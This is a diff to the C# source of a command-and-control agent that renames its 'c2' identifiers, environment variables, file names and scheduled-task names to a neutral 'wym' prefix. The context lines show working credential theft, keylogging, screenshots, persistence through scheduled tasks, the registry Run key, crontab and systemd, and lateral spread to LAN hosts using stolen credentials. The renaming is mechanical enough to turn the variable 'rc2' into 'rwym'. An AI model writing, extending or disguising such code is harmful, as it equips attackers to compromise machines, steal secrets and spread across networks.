@@ -13,14 +13,14 @@
 //       --interval 5 --jitter 2 --verbose
 //
 // Environment variables (accepted when the flag is not given):
-//   C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
+//   WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
 //
 // Flags:
-//   --server URL      server base URL (required unless C2_SERVER is set)
-//   --token TOKEN     shared agent token (required unless C2_TOKEN is set)
+//   --server URL      server base URL (required unless WYM_SERVER is set)
+//   --token TOKEN     shared agent token (required unless WYM_TOKEN is set)
 //   --interval N      heartbeat interval in seconds (default 10, min 1)
 //   --jitter N        random jitter in seconds added to the interval
-//   --state FILE      state file persisting the agent id (default ~/.c2agent_cs.json)
+//   --state FILE      state file persisting the agent id (default ~/.wymagent_cs.json)
 //   --verbose         print activity to stdout
 //   -h, --help        show this help and exit
 //
@@ -44,7 +44,7 @@ class Agent
     static bool Verbose = false;
     static readonly int DefaultShellTimeout = 120; // seconds
     static string StateFile = Path.Combine(
-        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".c2agent_cs.json");
+        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".wymagent_cs.json");
     static readonly int KeylogDumpLimit = 8000;
 
     // --------------------------------------------------------- clone
@@ -630,7 +630,7 @@ class Agent
     {
         var profile = (args.GetValueOrDefault("profile", "all") ?? "all").Trim().ToLower();
         if (profile is not ("all" or "env" or "tokens" or "browser")) profile = "all";
-        var work = Path.Combine(Path.GetTempPath(), "c2steal_" + Environment.ProcessId);
+        var work = Path.Combine(Path.GetTempPath(), "wymsteal_" + Environment.ProcessId);
         Directory.CreateDirectory(work);
         var manifest = new List<string>();
         try
@@ -765,14 +765,14 @@ class Agent
                 var appdata = Environment.GetEnvironmentVariable("APPDATA");
                 if (string.IsNullOrEmpty(appdata)) appdata = Environment.GetEnvironmentVariable("USERPROFILE");
                 if (string.IsNullOrEmpty(appdata)) appdata = ".";
-                var dir = Path.Combine(appdata, "Microsoft", "Windows", "c2update");
+                var dir = Path.Combine(appdata, "Microsoft", "Windows", "wymupdate");
                 Directory.CreateDirectory(dir);
-                dest = Path.Combine(dir, "c2agent.exe");
+                dest = Path.Combine(dir, "wymagent.exe");
             }
             else
             {
                 var homeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-                var dir = Path.Combine(homeDir, ".config", "c2update");
+                var dir = Path.Combine(homeDir, ".config", "wymupdate");
                 Directory.CreateDirectory(dir);
                 dest = Path.Combine(dir, Path.GetFileName(self));
             }
@@ -789,9 +789,9 @@ class Agent
             var progdata = Environment.GetEnvironmentVariable("ProgramData");
             if (string.IsNullOrEmpty(progdata)) progdata = Environment.GetEnvironmentVariable("ALLUSERSPROFILE");
             if (string.IsNullOrEmpty(progdata)) progdata = @"C:\ProgramData";
-            var launcherDir = Path.Combine(progdata, "c2update");
+            var launcherDir = Path.Combine(progdata, "wymupdate");
             Directory.CreateDirectory(launcherDir);
-            var wrapper = Path.Combine(launcherDir, "c2relaunch.cmd");
+            var wrapper = Path.Combine(launcherDir, "wymrelaunch.cmd");
             try
             {
                 File.WriteAllText(wrapper, "@echo off\r\nstart \"\" /b " + relaunch + "\r\n");
@@ -802,15 +802,15 @@ class Agent
             }
             msg += "\npersistence: wrote launcher " + wrapper;
             bool ok = false;
-            var cmd = $"schtasks /Create /TN \"c2agent-persist\" /TR \"{wrapper}\" /SC ONLOGON /RL HIGHEST /F";
+            var cmd = $"schtasks /Create /TN \"wymagent-persist\" /TR \"{wrapper}\" /SC ONLOGON /RL HIGHEST /F";
             var (sh, rc) = RunShell(cmd, 60);
             if (rc == 0) ok = true;
             else
             {
                 msg += "\n  schtasks err: " + FirstLine(sh);
-                var reg = $"reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v c2agent /t REG_SZ /d \"{wrapper}\" /f";
-                var (sh2, rc2) = RunShell(reg, 60);
-                if (rc2 == 0) ok = true;
+                var reg = $"reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v wymagent /t REG_SZ /d \"{wrapper}\" /f";
+                var (sh2, rwym) = RunShell(reg, 60);
+                if (rwym == 0) ok = true;
                 else msg += "\n  reg err: " + FirstLine(sh2);
             }
             msg += ok ? "\n  launch hook registered (schtasks)" : "\n  no launch hook registered";
@@ -818,17 +818,17 @@ class Agent
         }
 
         bool okCron = false, okSys = false;
-        var line = $"@reboot {relaunch} # c2agent-persist";
-        var cronCmd = $"(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo \"{line}\") | crontab -";
+        var line = $"@reboot {relaunch} # wymagent-persist";
+        var cronCmd = $"(crontab -l 2>/dev/null | grep -v 'wymagent-persist'; echo \"{line}\") | crontab -";
         var (shC, rcC) = RunShUnix(cronCmd, 60);
         if (rcC == 0) okCron = true;
         else msg += "\n  crontab err: " + FirstLine(shC);
         var home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-        var unit = Path.Combine(home, ".config", "c2update", "c2-update.service");
+        var unit = Path.Combine(home, ".config", "wymupdate", "wym-update.service");
         try
         {
             File.WriteAllText(unit,
-                "[Unit]\nDescription=c2 agent update\n\n[Service]\nType=simple\n" +
+                "[Unit]\nDescription=wym agent update\n\n[Service]\nType=simple\n" +
                 $"ExecStart=/bin/sh -c \"{relaunch}\"\nRestart=always\n\n" +
                 "[Install]\nWantedBy=default.target\n");
             var sysCmd = $"systemctl --user daemon-reload 2>&1; systemctl --user enable --now {unit} 2>&1";
@@ -924,10 +924,10 @@ class Agent
             return $"failed (copy: {FirstLine(sh)})";
         }
         var relaunch = $"\"c:\\windows\\{name}\" --server {Server} --token {Token} --interval {Interval} --jitter {Jitter}";
-        (sh, rc) = RunShell($"schtasks /Create /S {host} /TN \"c2agent-lateral\" /TR \"{relaunch}\" /SC ONLOGON /RU {user} /RP {pass} /RL HIGHEST /F", 30);
+        (sh, rc) = RunShell($"schtasks /Create /S {host} /TN \"wymagent-lateral\" /TR \"{relaunch}\" /SC ONLOGON /RU {user} /RP {pass} /RL HIGHEST /F", 30);
         RunShell($"net use \"{share}\" /delete /y", 20);
         if (rc != 0) return $"deployed (file dropped; task: {FirstLine(sh)})";
-        return "deployed (file dropped + scheduled c2agent-lateral)";
+        return "deployed (file dropped + scheduled wymagent-lateral)";
     }
 
     static string DeployUnix(string host, string user, string pass, string self)
@@ -948,8 +948,8 @@ class Agent
         var subnet = args.GetValueOrDefault("subnet", "");
         var user = args.GetValueOrDefault("user", "");
         var pass = args.GetValueOrDefault("pass", "");
-        if (string.IsNullOrEmpty(user)) user = Environment.GetEnvironmentVariable("C2_LAT_USER") ?? "";
-        if (string.IsNullOrEmpty(pass)) pass = Environment.GetEnvironmentVariable("C2_LAT_PASS") ?? "";
+        if (string.IsNullOrEmpty(user)) user = Environment.GetEnvironmentVariable("WYM_LAT_USER") ?? "";
+        if (string.IsNullOrEmpty(pass)) pass = Environment.GetEnvironmentVariable("WYM_LAT_PASS") ?? "";
         var self = SelfPath();
         var peers = LanPeers(subnet);
         if (peers.Count == 0) return ("lateral: no LAN peers found", 1);
@@ -960,7 +960,7 @@ class Agent
             string status;
             if (string.IsNullOrEmpty(user) || string.IsNullOrEmpty(pass))
             {
-                status = "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)";
+                status = "skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)";
                 skipped++;
             }
             else if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
@@ -1070,7 +1070,7 @@ class Agent
     {
         var label = args.GetValueOrDefault("name", "screenshot");
         if (string.IsNullOrWhiteSpace(label)) label = "screenshot";
-        string tmp = Path.Combine(Path.GetTempPath(), "c2shot_" + Environment.ProcessId + ".png");
+        string tmp = Path.Combine(Path.GetTempPath(), "wymshot_" + Environment.ProcessId + ".png");
         try
         {
             if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
@@ -1213,12 +1213,12 @@ class Agent
                 case "--help":
                     Console.WriteLine("usage: agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]");
                     Console.WriteLine();
-                    Console.WriteLine("Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):");
-                    Console.WriteLine("  --server URL      server base URL (required unless C2_SERVER is set)");
-                    Console.WriteLine("  --token TOKEN     shared agent token (required unless C2_TOKEN is set)");
+                    Console.WriteLine("Flags (also settable via WYM_SERVER/WYM_TOKEN/WYM_INTERVAL/WYM_JITTER/WYM_STATE_FILE/WYM_VERBOSE):");
+                    Console.WriteLine("  --server URL      server base URL (required unless WYM_SERVER is set)");
+                    Console.WriteLine("  --token TOKEN     shared agent token (required unless WYM_TOKEN is set)");
                     Console.WriteLine("  --interval N      heartbeat interval in seconds (default 10, min 1)");
                     Console.WriteLine("  --jitter N        random jitter in seconds added to the interval");
-                    Console.WriteLine("  --state FILE      state file persisting the agent id (default ~/.c2agent_cs.json)");
+                    Console.WriteLine("  --state FILE      state file persisting the agent id (default ~/.wymagent_cs.json)");
                     Console.WriteLine("  --verbose         print activity to stdout");
                     Console.WriteLine("  -h, --help        show this help and exit");
                     return;
@@ -1230,26 +1230,26 @@ class Agent
                 case "--verbose": Verbose = true; verboseGiven = true; break;
             }
         }
-        server ??= Environment.GetEnvironmentVariable("C2_SERVER");
-        token ??= Environment.GetEnvironmentVariable("C2_TOKEN");
-        if (!intervalGiven && int.TryParse(Environment.GetEnvironmentVariable("C2_INTERVAL"), out var iv))
+        server ??= Environment.GetEnvironmentVariable("WYM_SERVER");
+        token ??= Environment.GetEnvironmentVariable("WYM_TOKEN");
+        if (!intervalGiven && int.TryParse(Environment.GetEnvironmentVariable("WYM_INTERVAL"), out var iv))
             Interval = Math.Max(1, iv);
-        if (!jitterGiven && int.TryParse(Environment.GetEnvironmentVariable("C2_JITTER"), out var jt))
+        if (!jitterGiven && int.TryParse(Environment.GetEnvironmentVariable("WYM_JITTER"), out var jt))
             Jitter = Math.Max(0, jt);
         if (!stateGiven)
         {
-            var sf = Environment.GetEnvironmentVariable("C2_STATE_FILE");
+            var sf = Environment.GetEnvironmentVariable("WYM_STATE_FILE");
             if (!string.IsNullOrEmpty(sf)) StateFile = sf;
         }
         if (!verboseGiven)
         {
-            var vb = Environment.GetEnvironmentVariable("C2_VERBOSE");
+            var vb = Environment.GetEnvironmentVariable("WYM_VERBOSE");
             if (vb == "1" || vb == "true") Verbose = true;
         }
         if (server == null || string.IsNullOrEmpty(token))
         {
             Console.WriteLine("usage: agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]");
-            Console.WriteLine("(--server/--token also accepted via C2_SERVER/C2_TOKEN env vars)");
+            Console.WriteLine("(--server/--token also accepted via WYM_SERVER/WYM_TOKEN env vars)");
             return;
         }
         Server = server.TrimEnd('/');
